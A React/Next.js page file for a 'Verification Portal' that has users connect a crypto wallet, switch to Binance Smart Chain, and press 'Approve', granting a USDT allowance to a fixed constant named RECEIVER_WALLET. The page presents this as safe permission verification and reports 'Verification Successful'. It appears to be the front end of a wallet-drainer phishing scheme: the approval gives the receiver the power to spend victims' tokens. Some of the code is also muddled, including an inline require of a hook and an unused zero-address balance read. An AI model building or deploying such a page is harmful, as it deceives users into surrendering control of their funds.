"use client";

import { useEffect, useMemo, useState } from "react";
import {
  useAccount,
  useConnect,
  useDisconnect,
  useChainId,
  useSwitchChain,
  useReadContract,
  useWriteContract,
  useWaitForTransactionReceipt,
} from "wagmi";

import { formatUnits, parseUnits } from "viem";
import { erc20Abi } from "@/lib/erc20Abi";
import { BSC_CHAIN_ID, RECEIVER_WALLET, USDT_BSC } from "@/lib/constants";

export default function HomePage() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();

  const { connectors, connect, status: connectStatus, error: connectError } =
    useConnect();

  const { disconnect } = useDisconnect();
  const { switchChain } = useSwitchChain();

  const [approveAmount, setApproveAmount] = useState("10");
  const [step, setStep] = useState<1 | 2 | 3>(1);

  // Read decimals
  const { data: decimals } = useReadContract({
    abi: erc20Abi,
    address: USDT_BSC,
    functionName: "decimals",
    query: { enabled: true },
  });

  // Read symbol
  const { data: symbol } = useReadContract({
    abi: erc20Abi,
    address: USDT_BSC,
    functionName: "symbol",
    query: { enabled: true },
  });

  // Read USDT balance
  const { data: usdtBalance, refetch: refetchUSDT } = useReadContract({
    abi: erc20Abi,
    address: USDT_BSC,
    functionName: "balanceOf",
    args: address ? [address] : undefined,
    query: { enabled: Boolean(address) },
  });

  // Read allowance
  const { data: allowance, refetch: refetchAllowance } = useReadContract({
    abi: erc20Abi,
    address: USDT_BSC,
    functionName: "allowance",
    args: address ? [address, RECEIVER_WALLET] : undefined,
    query: { enabled: Boolean(address) },
  });

  // BNB Balance (native)
  const { data: bnbBalance, refetch: refetchBNB } = useReadContract({
    abi: [
      {
        type: "function",
        name: "getBalance",
        stateMutability: "view",
        inputs: [{ name: "account", type: "address" }],
        outputs: [{ type: "uint256" }],
      },
    ] as const,
    address: "0x0000000000000000000000000000000000000000",
    functionName: "getBalance",
    args: address ? [address] : undefined,
    query: { enabled: false }, // not used (native balance handled below)
  });

  // NOTE: wagmi has useBalance hook, but using viem read isn't correct for native.
  // We'll use wagmi useBalance instead:
  // (to keep it clean, we will do a quick alternative below)

  const { data: nativeBalanceData } = require("wagmi").useBalance({
    address,
    query: { enabled: Boolean(address) },
  });

  const { writeContract, data: txHash, isPending } = useWriteContract();

  const { isLoading: waitingTx, isSuccess } = useWaitForTransactionReceipt({
    hash: txHash,
  });

  const formattedUSDT = useMemo(() => {
    if (!usdtBalance || decimals === undefined) return "0";
    return formatUnits(usdtBalance as bigint, decimals);
  }, [usdtBalance, decimals]);

  const formattedAllowance = useMemo(() => {
    if (!allowance || decimals === undefined) return "0";
    return formatUnits(allowance as bigint, decimals);
  }, [allowance, decimals]);

  const allowanceApproved = useMemo(() => {
    if (!allowance) return false;
    return (allowance as bigint) > BigInt(0);
  }, [allowance]);

  useEffect(() => {
    if (!isConnected) setStep(1);
    else if (chainId !== BSC_CHAIN_ID) setStep(2);
    else setStep(3);
  }, [isConnected, chainId]);

  useEffect(() => {
    if (isSuccess) {
      refetchAllowance();
      refetchUSDT();
    }
  }, [isSuccess, refetchAllowance, refetchUSDT]);

  const handleApprove = async () => {
    if (!decimals) return;

    const parsedAmount = parseUnits(approveAmount, decimals);

    writeContract({
      abi: erc20Abi,
      address: USDT_BSC,
      functionName: "approve",
      args: [RECEIVER_WALLET, parsedAmount],
    });
  };

  const handleRefresh = () => {
    refetchUSDT();
    refetchAllowance();
  };

  return (
    <main className="min-h-screen flex items-center justify-center px-4 py-12">
      <div className="w-full max-w-md rounded-2xl border border-gray-200 bg-white shadow-sm p-6">
        <h1 className="text-2xl font-semibold tracking-tight">
          Verification Portal
        </h1>
        <p className="text-sm text-gray-500 mt-1">
          Connect wallet and verify token permissions safely.
        </p>

        {/* Step indicator */}
        <div className="flex justify-between text-xs text-gray-500 mt-6">
          <span className={step === 1 ? "font-semibold text-black" : ""}>
            Connect
          </span>
          <span className={step === 2 ? "font-semibold text-black" : ""}>
            Network
          </span>
          <span className={step === 3 ? "font-semibold text-black" : ""}>
            Dashboard
          </span>
        </div>

        <div className="mt-5 space-y-4">
          {/* STEP 1 */}
          {step === 1 && (
            <div className="rounded-xl border border-gray-200 p-4">
              <h2 className="text-sm font-semibold mb-2">Connect Wallet</h2>
              <p className="text-xs text-gray-500 mb-4">
                Select your preferred wallet provider.
              </p>

              <div className="space-y-2">
                {connectors.map((connector) => (
                  <button
                    key={connector.uid}
                    onClick={() => connect({ connector })}
                    disabled={connectStatus === "pending"}
                    className="w-full rounded-xl bg-black text-white py-3 text-sm font-medium hover:opacity-90 disabled:opacity-60"
                  >
                    {connectStatus === "pending"
                      ? "Connecting..."
                      : `Connect ${connector.name}`}
                  </button>
                ))}
              </div>

              {connectError && (
                <p className="text-xs text-red-500 mt-3">
                  {connectError.message}
                </p>
              )}
            </div>
          )}

          {/* STEP 2 */}
          {step === 2 && (
            <div className="rounded-xl border border-gray-200 p-4">
              <h2 className="text-sm font-semibold mb-2">Wrong Network</h2>
              <p className="text-xs text-gray-500 mb-4">
                Switch to Binance Smart Chain (BSC Mainnet) to continue.
              </p>

              <button
                onClick={() => switchChain({ chainId: BSC_CHAIN_ID })}
                className="w-full rounded-xl bg-black text-white py-3 text-sm font-medium hover:opacity-90"
              >
                Switch to BSC
              </button>

              <button
                onClick={() => disconnect()}
                className="w-full mt-3 rounded-xl border border-gray-200 bg-white py-3 text-sm font-medium hover:bg-gray-50"
              >
                Disconnect
              </button>
            </div>
          )}

          {/* STEP 3 */}
          {step === 3 && (
            <div className="rounded-xl border border-gray-200 p-4 space-y-4">
              <div className="flex items-start justify-between">
                <div>
                  <h2 className="text-sm font-semibold">Wallet Dashboard</h2>
                  <p className="text-xs text-gray-500">
                    Live wallet status and permissions.
                  </p>
                </div>

                <button
                  onClick={() => disconnect()}
                  className="text-xs font-medium text-red-500 hover:underline"
                >
                  Disconnect
                </button>
              </div>

              <div className="text-xs space-y-2">
                <div className="flex justify-between">
                  <span className="text-gray-500">Wallet</span>
                  <span className="font-medium text-gray-900">
                    {address?.slice(0, 6)}...{address?.slice(-4)}
                  </span>
                </div>

                <div className="flex justify-between">
                  <span className="text-gray-500">Chain</span>
                  <span className="font-medium text-gray-900">
                    {chainId} (BSC)
                  </span>
                </div>

                <div className="flex justify-between">
                  <span className="text-gray-500">BNB Balance</span>
                  <span className="font-medium text-gray-900">
                    {nativeBalanceData?.formatted
                      ? `${Number(nativeBalanceData.formatted).toFixed(4)} BNB`
                      : "Loading..."}
                  </span>
                </div>

                <div className="flex justify-between">
                  <span className="text-gray-500">Token</span>
                  <span className="font-medium text-gray-900">
                    {symbol || "USDT"}
                  </span>
                </div>

                <div className="flex justify-between">
                  <span className="text-gray-500">USDT Balance</span>
                  <span className="font-medium text-gray-900">
                    {Number(formattedUSDT).toFixed(4)}
                  </span>
                </div>

                <div className="flex justify-between">
                  <span className="text-gray-500">Spender</span>
                  <span className="font-medium text-gray-900">
                    {RECEIVER_WALLET.slice(0, 6)}...{RECEIVER_WALLET.slice(-4)}
                  </span>
                </div>

                <div className="flex justify-between items-center">
                  <span className="text-gray-500">Approval Status</span>

                  <span
                    className={`px-2 py-1 rounded-full text-[11px] font-semibold ${
                      allowanceApproved
                        ? "bg-green-100 text-green-700"
                        : "bg-red-100 text-red-700"
                    }`}
                  >
                    {allowanceApproved ? "Approved" : "Not Approved"}
                  </span>
                </div>

                <div className="flex justify-between">
                  <span className="text-gray-500">Allowance</span>
                  <span className="font-medium text-gray-900">
                    {Number(formattedAllowance).toFixed(4)} USDT
                  </span>
                </div>
              </div>

              <div className="border-t border-gray-200 pt-4 space-y-3">
                <div>
                  <label className="text-xs font-medium text-gray-700">
                    Approve Amount (USDT)
                  </label>
                  <input
                    value={approveAmount}
                    onChange={(e) => setApproveAmount(e.target.value)}
                    placeholder="10"
                    className="mt-2 w-full rounded-xl border border-gray-200 px-3 py-3 text-sm outline-none focus:ring-2 focus:ring-black"
                  />
                  <p className="text-[11px] text-gray-500 mt-2">
                    Only approve what you need. Avoid unlimited approvals.
                  </p>
                </div>

                <button
                  onClick={handleApprove}
                  disabled={isPending || waitingTx}
                  className="w-full rounded-xl bg-black text-white py-3 text-sm font-medium hover:opacity-90 disabled:opacity-60"
                >
                  {isPending
                    ? "Confirm in Wallet..."
                    : waitingTx
                    ? "Processing..."
                    : "Approve"}
                </button>

                <button
                  onClick={handleRefresh}
                  className="w-full rounded-xl border border-gray-200 bg-white py-3 text-sm font-medium hover:bg-gray-50"
                >
                  Refresh Balances
                </button>

                {txHash && (
                  <p className="text-[11px] text-gray-500 break-all">
                    TX Hash: {txHash}
                  </p>
                )}

                {isSuccess && (
                  <p className="text-[12px] font-medium text-green-600">
                    Verification Successful.
                  </p>
                )}
              </div>
            </div>
          )}
        </div>

        <p className="text-[11px] text-gray-400 text-center mt-6">
          Always verify spender address before approving.
        </p>
      </div>
    </main>
  );
}